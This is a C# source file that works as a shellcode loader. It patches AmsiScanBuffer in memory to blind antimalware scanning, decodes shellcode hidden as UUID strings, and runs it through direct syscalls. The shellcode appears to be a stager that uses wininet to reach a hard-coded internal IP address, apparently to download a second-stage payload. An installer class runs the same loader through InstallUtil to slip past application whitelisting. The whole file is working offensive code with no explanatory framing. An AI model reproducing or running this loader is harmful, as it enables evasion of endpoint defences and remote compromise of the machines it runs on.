using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.IO.Compression;
using System.IO;

using System.Configuration.Install;

using Data = SharpWhispers.Data;
using Syscall = Syscalls.Syscalls;
using System.Collections;

namespace BasicProcessInjection
{
    [ComVisible(true), ClassInterface(ClassInterfaceType.AutoDual)]
    public class Program
    {

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);


        public static byte[] ConvertUuidsToShellcode(string[] uuids)
        {
            byte[] Shellcode = new byte[uuids.Length * 16];
            int index = 0;

            foreach (string uuid in uuids)
            {
                try
                {
                    Guid guid = Guid.Parse(uuid);
                    byte[] bytes = guid.ToByteArray();
                    Array.Copy(bytes, 0, Shellcode, index, bytes.Length);
                    index += bytes.Length;
                }
                catch (FormatException)
                {
                    Console.WriteLine($"Invalid UUID format: {uuid}");
                }
            }

            return Shellcode;
        }


        static void Main()
        {

            // offset 0x83 => 0x74
            // offset 0x95 => 0x75

            IntPtr lib = LoadLibrary("amsi.dll");
            IntPtr amsi = GetProcAddress(lib, "AmsiScanBuffer");
            IntPtr final = IntPtr.Add(amsi, 0x95);
            uint old = 0;

            VirtualProtect(final, (UInt32)0x1, 0x40, out old);

            Console.WriteLine(old);
            byte[] patch = new byte[] { 0x75 };
            Marshal.Copy(patch, 0, final, 1);

            VirtualProtect(final, (UInt32)0x1, old, out old);


            Run();
        }
       

        public static void Run()
        {


            byte[] Shellcode = ConvertUuidsToShellcode(new string[]{
"e48348fc-e8f0-00cc-0000-415141505248",
"4865d231-528b-4860-8b52-185156488b52",
"b70f4820-4a4a-8b48-7250-4d31c94831c0",
"7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
"528b4852-4120-8b51-423c-4801d0668178",
"0f020b18-7285-0000-008b-808800000048",
"6774c085-0148-8bd0-4818-50448b402049",
"56e3d001-314d-48c9-ffc9-418b34884801",
"c03148d6-c141-0dc9-ac41-01c138e075f1",
"244c034c-4508-d139-75d8-58448b402449",
"4166d001-0c8b-4448-8b40-1c4901d0418b",
"58418804-5841-0148-d05e-595a41584159",
"83485a41-20ec-5241-ffe0-5841595a488b",
"ff4be912-ffff-485d-31db-5349be77696e",
"74656e69-4100-4856-89e1-49c7c24c7726",
"53d5ff07-4853-e189-535a-4d31c04d31c9",
"ba495353-563a-a779-0000-0000ffd5e80f",
"31000000-3239-312e-3638-2e34302e3133",
"485a0037-c189-c749-c0bb-0100004d31c9",
"036a5353-4953-57ba-899f-c600000000ff",
"0039e8d5-0000-482f-4469-727350386f45",
"374b6f59-7651-6276-5443-5436777a3332",
"73636e56-4251-5367-3178-57555f67752d",
"79656d43-5668-5a38-786b-69684f610048",
"5a53c189-5841-314d-c953-48b80032a884",
"00000000-5350-4953-c7c2-eb552e3bffd5",
"6ac68948-5f0a-8948-f16a-1f5a52688033",
"89490000-6ae0-4104-5949-ba75469e8600",
"ff000000-4dd5-c031-535a-4889f14d31c9",
"53c9314d-4953-c2c7-2d06-187bffd585c0",
"c7481f75-88c1-0013-0049-ba44f035e000",
"ff000000-48d5-cfff-7402-ebaae8550000",
"6a595300-5a40-8949-d1c1-e21049c7c000",
"49000010-58ba-53a4-e500-000000ffd548",
"48535393-e789-8948-f148-89da49c7c000",
"49000020-f989-ba49-1296-89e200000000",
"8348d5ff-20c4-c085-74b2-668b074801c3",
"d275c085-c358-6a58-0059-49c7c2f0b5a2",
"90d5ff56-9090-9090-9090-909090909090" });



        IntPtr HProc;

            IntPtr ShellcodeSize = (IntPtr)Shellcode.Length;

            HProc = (IntPtr)(-1);

            IntPtr BaseAddress = IntPtr.Zero;
            IntPtr AllocationSize = ShellcodeSize;


            Data.Native.NTSTATUS retValue = Syscall.NtAllocateVirtualMemory(
                HProc, 
                ref BaseAddress, 
                IntPtr.Zero, 
                ref AllocationSize,
                Data.Win32.Kernel32.MEM_COMMIT | Data.Win32.Kernel32.MEM_RESERVE,Data.Win32.WinNT.PAGE_READWRITE);



            // Get Pointer to local shellcode
            IntPtr Shellcodeptr = IntPtr.Zero;
            unsafe
            {
                fixed (byte* p = Shellcode)
                {
                    Shellcodeptr = (IntPtr)p;
                }
            }

            uint res = 0;
            res = Syscall.NtWriteVirtualMemory(HProc, BaseAddress, Shellcodeptr, (uint)ShellcodeSize);


            AllocationSize = ShellcodeSize;
            IntPtr ProtectAddress = BaseAddress;
            Syscall.NtProtectVirtualMemory(HProc, ref ProtectAddress, ref AllocationSize, Data.Win32.WinNT.PAGE_EXECUTE_READ);
            //Thread.Sleep(10000);

            IntPtr HThread = IntPtr.Zero;
            res = (uint)Syscall.NtCreateThreadEx(ref HThread, Data.Win32.WinNT.ACCESS_MASK.GENERIC_ALL, (IntPtr)0, HProc, BaseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);


            WaitForSingleObject(HThread, 0xFFFFFFFF);


        }
        [DllImport("kernel32.dll", SetLastError = true)]

        
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    }


    [System.ComponentModel.RunInstaller(true)]
    public class MyInstaller : Installer
    {
        public override void Install(IDictionary stateSaver)
        {
            base.Install(stateSaver);
            //Class1.print();
            Program.Run();
            // Do your thing...
        }
    }
}